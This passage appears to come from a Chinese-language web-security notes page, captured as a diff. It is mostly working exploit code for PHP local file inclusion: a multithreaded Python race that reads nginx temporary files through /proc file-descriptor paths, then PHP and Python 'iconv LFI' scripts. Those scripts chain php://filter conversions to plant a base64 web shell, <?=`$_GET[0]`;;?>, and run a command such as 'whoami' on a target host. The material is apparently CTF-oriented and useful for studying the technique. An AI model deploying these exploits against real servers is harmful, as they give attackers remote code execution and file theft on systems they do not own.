+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">##### This method creates a path from random amount of ProcFS path components. A generated path will look like /proc/&lt;nginx pid 1&gt;/cwd/proc/&lt;nginx pid 2&gt;/root/proc/&lt;nginx pid 3&gt;/root</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">path</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">component_num</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">random</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">randint</span>(<span style="color:#a6be9d">0</span>, <span style="color:#a6be9d">10</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">for</span> <span style="color:#58a1dd">_</span> <span style="color:#ff636f">in</span> <span style="color:#58a1dd">range</span>(<span style="color:#58a1dd">component_num</span>):
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">pid</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">random</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">choice</span>(<span style="color:#58a1dd">nginx_pids</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">if</span> <span style="color:#58a1dd">random</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">randint</span>(<span style="color:#a6be9d">0</span>, <span style="color:#a6be9d">1</span>) <span style="color:#ff636f">==</span> <span style="color:#a6be9d">0</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">path</span> <span style="color:#ff636f">+=</span> <span style="color:#a6be9d">f</span><span style="color:#a6be9d">&#34;/proc/</span><span style="color:#a6be9d">{</span><span style="color:#58a1dd">pid</span><span style="color:#a6be9d">}</span><span style="color:#a6be9d">/cwd&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">else</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">path</span> <span style="color:#ff636f">+=</span> <span style="color:#a6be9d">f</span><span style="color:#a6be9d">&#34;/proc/</span><span style="color:#a6be9d">{</span><span style="color:#58a1dd">pid</span><span style="color:#a6be9d">}</span><span style="color:#a6be9d">/root&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">return</span> <span style="color:#58a1dd">path</span>
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#####遍历读fd文件</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">def</span> <span style="color:#58a1dd">read_file</span>(<span style="color:#58a1dd">requests_session</span>, <span style="color:#58a1dd">nginx_pid</span>, <span style="color:#58a1dd">fd</span>, <span style="color:#58a1dd">nginx_pids</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">nginx_pid_list</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">list</span>(<span style="color:#58a1dd">nginx_pids</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">while</span> <span style="color:#ff636f">True</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">path</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">generate_random_path_prefix</span>(<span style="color:#58a1dd">nginx_pid_list</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">path</span> <span style="color:#ff636f">+=</span> <span style="color:#a6be9d">f</span><span style="color:#a6be9d">&#34;/proc/</span><span style="color:#a6be9d">{</span><span style="color:#58a1dd">nginx_pid</span><span style="color:#a6be9d">}</span><span style="color:#a6be9d">/fd/</span><span style="color:#a6be9d">{</span><span style="color:#58a1dd">fd</span><span style="color:#a6be9d">}</span><span style="color:#a6be9d">&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">try</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">d</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">requests_session</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">get</span>(<span style="color:#58a1dd">SERVER</span> <span style="color:#ff636f">+</span> <span style="color:#a6be9d">f</span><span style="color:#a6be9d">&#34;/?action=include&amp;file=</span><span style="color:#a6be9d">{</span><span style="color:#58a1dd">path</span><span style="color:#a6be9d">}</span><span style="color:#a6be9d">&#34;</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">text</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">except</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#ff636f">continue</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">if</span> <span style="color:#a6be9d">&#34;flag&#34;</span> <span style="color:#ff636f">in</span> <span style="color:#58a1dd">d</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">print</span>(<span style="color:#a6be9d">&#34;Found flag! &#34;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">print</span>(<span style="color:#58a1dd">d</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">exit</span>()
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#####多线程竞争临时文件</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">def</span> <span style="color:#58a1dd">read_file_worker</span>(<span style="color:#58a1dd">requests_session</span>, <span style="color:#58a1dd">nginx_pid</span>, <span style="color:#58a1dd">nginx_pids</span>):
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">##### Scan Nginx FDs between 10 - 45 in a loop. Since files and sockets keep closing - it&#39;s very common for the request body FD to open within this range</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">for</span> <span style="color:#58a1dd">fd</span> <span style="color:#ff636f">in</span> <span style="color:#58a1dd">range</span>(<span style="color:#a6be9d">10</span>, <span style="color:#a6be9d">45</span>):
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">thread</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">threading</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">Thread</span>(<span style="color:#58a1dd">target</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">read_file</span>, <span style="color:#58a1dd">args</span> <span style="color:#ff636f">=</span> (<span style="color:#58a1dd">requests_session</span>, <span style="color:#58a1dd">nginx_pid</span>, <span style="color:#58a1dd">fd</span>, <span style="color:#58a1dd">nginx_pids</span>))
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">thread</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">start</span>()
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#####多进程竞争临时文件</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">def</span> <span style="color:#58a1dd">read_file_multiprocess</span>(<span style="color:#58a1dd">requests_session</span>, <span style="color:#58a1dd">nginx_pids</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">for</span> <span style="color:#58a1dd">nginx_pid</span> <span style="color:#ff636f">in</span> <span style="color:#58a1dd">nginx_pids</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">p</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">multiprocessing</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">Process</span>(<span style="color:#58a1dd">target</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">read_file_worker</span>, <span style="color:#58a1dd">args</span><span style="color:#ff636f">=</span>(<span style="color:#58a1dd">requests_session</span>, <span style="color:#58a1dd">nginx_pid</span>, <span style="color:#58a1dd">nginx_pids</span>))
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">p</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">start</span>()
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">if</span> <span style="color:#58a1dd">__name__</span> <span style="color:#ff636f">==</span> <span style="color:#a6be9d">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">print</span>(<span style="color:#a6be9d">&#39;[DEBUG] Creating requests session&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">requests_session</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">create_requests_session</span>()
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">print</span>(<span style="color:#a6be9d">&#39;[DEBUG] Getting Nginx pids&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">nginx_pids</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">get_nginx_pids</span>(<span style="color:#58a1dd">requests_session</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">print</span>(<span style="color:#a6be9d">f</span><span style="color:#a6be9d">&#39;[DEBUG] Nginx pids: </span><span style="color:#a6be9d">{</span><span style="color:#58a1dd">nginx_pids</span><span style="color:#a6be9d">}</span><span style="color:#a6be9d">&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">print</span>(<span style="color:#a6be9d">&#39;[DEBUG] Starting payload sending&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">send_payload_multiprocess</span>(<span style="color:#58a1dd">requests_session</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">print</span>(<span style="color:#a6be9d">&#39;[DEBUG] Starting fd readers&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">read_file_multiprocess</span>(<span style="color:#58a1dd">requests_session</span>, <span style="color:#58a1dd">nginx_pids</span>)</span></span></code></pre></div><h5 id="iconv-lfi" class="heading-element"><span>0.0.0.5  iconv LFI</span>
+  <a href="#iconv-lfi" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p><a href="http://tttang.com/archive/1395/"target="_blank" rel="external nofollow noopener noreferrer">http://tttang.com/archive/1395/</a></p>
+<p><a href="https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT</a></p>
+<p><a href="https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d"target="_blank" rel="external nofollow noopener noreferrer">https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d</a></p>
+<p>在 PHP 中，我们可以利用 PHP Base64 Filter 宽松的解析，通过 iconv filter 等编码组合构造出特定的 PHP 代码进而完成无需<strong>临时文件</strong>的 RCE 。</p>
+<p>PHP Filter 当中有一种 <code>convert.iconv</code> 的 Filter ，可以用来将数据从字符集 A 转换为字符集 B ，其中这两个字符集可以从 <code>iconv -l</code> 获得，这个字符集比较长，不过也存在一些实际上是其他字符集的别名。</p>
+<p>exp</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff636f">&lt;</span>?<span style="color:#58a1dd">php</span>
+</span></span><span style="display:flex;"><span>$<span style="color:#58a1dd">base64_payload</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#34;PD89YCRfR0VUWzBdYDs7Pz4&#34;</span>;
+</span></span><span style="display:flex;"><span>$<span style="color:#58a1dd">conversions</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">array</span>(
+</span></span><span style="display:flex;"><span>    <span style="color:#a6be9d">&#39;R&#39;</span> <span style="color:#ff636f">=&gt;</span> <span style="color:#a6be9d">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6be9d">&#39;B&#39;</span> <span style="color:#ff636f">=&gt;</span> <span style="color:#a6be9d">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6be9d">&#39;C&#39;</span> <span style="color:#ff636f">=&gt;</span> <span style="color:#a6be9d">&#39;convert.iconv.UTF8.CSISO2022KR&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6be9d">&#39;8&#39;</span> <span style="color:#ff636f">=&gt;</span> <span style="color:#a6be9d">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6be9d">&#39;9&#39;</span> <span style="color:#ff636f">=&gt;</span> <span style="color:#a6be9d">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6be9d">&#39;f&#39;</span> <span style="color:#ff636f">=&gt;</span> <span style="color:#a6be9d">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6be9d">&#39;s&#39;</span> <span style="color:#ff636f">=&gt;</span> <span style="color:#a6be9d">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6be9d">&#39;z&#39;</span> <span style="color:#ff636f">=&gt;</span> <span style="color:#a6be9d">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6be9d">&#39;U&#39;</span> <span style="color:#ff636f">=&gt;</span> <span style="color:#a6be9d">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6be9d">&#39;P&#39;</span> <span style="color:#ff636f">=&gt;</span> <span style="color:#a6be9d">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6be9d">&#39;V&#39;</span> <span style="color:#ff636f">=&gt;</span> <span style="color:#a6be9d">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6be9d">&#39;0&#39;</span> <span style="color:#ff636f">=&gt;</span> <span style="color:#a6be9d">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6be9d">&#39;Y&#39;</span> <span style="color:#ff636f">=&gt;</span> <span style="color:#a6be9d">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6be9d">&#39;W&#39;</span> <span style="color:#ff636f">=&gt;</span> <span style="color:#a6be9d">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6be9d">&#39;d&#39;</span> <span style="color:#ff636f">=&gt;</span> <span style="color:#a6be9d">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6be9d">&#39;D&#39;</span> <span style="color:#ff636f">=&gt;</span> <span style="color:#a6be9d">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6be9d">&#39;7&#39;</span> <span style="color:#ff636f">=&gt;</span> <span style="color:#a6be9d">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6be9d">&#39;4&#39;</span> <span style="color:#ff636f">=&gt;</span> <span style="color:#a6be9d">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#39;</span>
+</span></span><span style="display:flex;"><span>);
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>$<span style="color:#58a1dd">filters</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#34;convert.base64-encode|&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">##### make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span>
+</span></span><span style="display:flex;"><span>$<span style="color:#58a1dd">filters</span> <span style="color:#ff636f">.=</span> <span style="color:#a6be9d">&#34;convert.iconv.UTF8.UTF7|&#34;</span>;
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">foreach</span> (<span style="color:#58a1dd">str_split</span>(<span style="color:#58a1dd">strrev</span>($<span style="color:#58a1dd">base64_payload</span>)) <span style="color:#ff636f">as</span> $<span style="color:#58a1dd">c</span>) {
+</span></span><span style="display:flex;"><span>    $<span style="color:#58a1dd">filters</span> <span style="color:#ff636f">.=</span> $<span style="color:#58a1dd">conversions</span>[$<span style="color:#58a1dd">c</span>] <span style="color:#ff636f">.</span> <span style="color:#a6be9d">&#34;|&#34;</span>;
+</span></span><span style="display:flex;"><span>    $<span style="color:#58a1dd">filters</span> <span style="color:#ff636f">.=</span> <span style="color:#a6be9d">&#34;convert.base64-decode|&#34;</span>;
+</span></span><span style="display:flex;"><span>    $<span style="color:#58a1dd">filters</span> <span style="color:#ff636f">.=</span> <span style="color:#a6be9d">&#34;convert.base64-encode|&#34;</span>;
+</span></span><span style="display:flex;"><span>    $<span style="color:#58a1dd">filters</span> <span style="color:#ff636f">.=</span> <span style="color:#a6be9d">&#34;convert.iconv.UTF8.UTF7|&#34;</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>$<span style="color:#58a1dd">filters</span> <span style="color:#ff636f">.=</span> <span style="color:#a6be9d">&#34;convert.base64-decode&#34;</span>;
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>$<span style="color:#58a1dd">final_payload</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#34;php://filter/{$filters}/resource=data://,aaaaaaaaaaaaaaaaaaaa&#34;</span>;
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">echo</span> (<span style="color:#58a1dd">file_get_contents</span>($<span style="color:#58a1dd">final_payload</span>));</span></span></code></pre></div><p>new</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">requests</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#####参数file</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">url</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#34;http://192.168.190.191/index.php&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">file_to_use</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#34;index&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">command</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#34;whoami&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#####&lt;?=`$_GET[0]`;;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">base64_payload</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#34;PD89YCRfR0VUWzBdYDs7Pz4&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">conversions</span> <span style="color:#ff636f">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6be9d">&#39;R&#39;</span>: <span style="color:#a6be9d">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6be9d">&#39;B&#39;</span>: <span style="color:#a6be9d">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6be9d">&#39;C&#39;</span>: <span style="color:#a6be9d">&#39;convert.iconv.UTF8.CSISO2022KR&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6be9d">&#39;8&#39;</span>: <span style="color:#a6be9d">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6be9d">&#39;9&#39;</span>: <span style="color:#a6be9d">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6be9d">&#39;f&#39;</span>: <span style="color:#a6be9d">&#39;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6be9d">&#39;s&#39;</span>: <span style="color:#a6be9d">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6be9d">&#39;z&#39;</span>: <span style="color:#a6be9d">&#39;convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6be9d">&#39;U&#39;</span>: <span style="color:#a6be9d">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6be9d">&#39;P&#39;</span>: <span style="color:#a6be9d">&#39;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6be9d">&#39;V&#39;</span>: <span style="color:#a6be9d">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6be9d">&#39;0&#39;</span>: <span style="color:#a6be9d">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6be9d">&#39;Y&#39;</span>: <span style="color:#a6be9d">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6be9d">&#39;W&#39;</span>: <span style="color:#a6be9d">&#39;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6be9d">&#39;d&#39;</span>: <span style="color:#a6be9d">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6be9d">&#39;D&#39;</span>: <span style="color:#a6be9d">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6be9d">&#39;7&#39;</span>: <span style="color:#a6be9d">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6be9d">&#39;4&#39;</span>: <span style="color:#a6be9d">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#39;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">##### generate some garbage base64</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">filters</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#34;convert.iconv.UTF8.CSISO2022KR|&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">filters</span> <span style="color:#ff636f">+=</span> <span style="color:#a6be9d">&#34;convert.base64-encode|&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">##### make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">filters</span> <span style="color:#ff636f">+=</span> <span style="color:#a6be9d">&#34;convert.iconv.UTF8.UTF7|&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">for</span> <span style="color:#58a1dd">c</span> <span style="color:#ff636f">in</span> <span style="color:#58a1dd">base64_payload</span>[::<span style="color:#ff636f">-</span><span style="color:#a6be9d">1</span>]:
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">filters</span> <span style="color:#ff636f">+=</span> <span style="color:#58a1dd">conversions</span>[<span style="color:#58a1dd">c</span>] <span style="color:#ff636f">+</span> <span style="color:#a6be9d">&#34;|&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">##### decode and reencode to get rid of everything that isn&#39;t valid base64</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">filters</span> <span style="color:#ff636f">+=</span> <span style="color:#a6be9d">&#34;convert.base64-decode|&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">filters</span> <span style="color:#ff636f">+=</span> <span style="color:#a6be9d">&#34;convert.base64-encode|&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">##### get rid of equal signs</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">filters</span> <span style="color:#ff636f">+=</span> <span style="color:#a6be9d">&#34;convert.iconv.UTF8.UTF7|&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">filters</span> <span style="color:#ff636f">+=</span> <span style="color:#a6be9d">&#34;convert.base64-decode&#34;</span>
+</span></span><span style="display:flex;"><span>
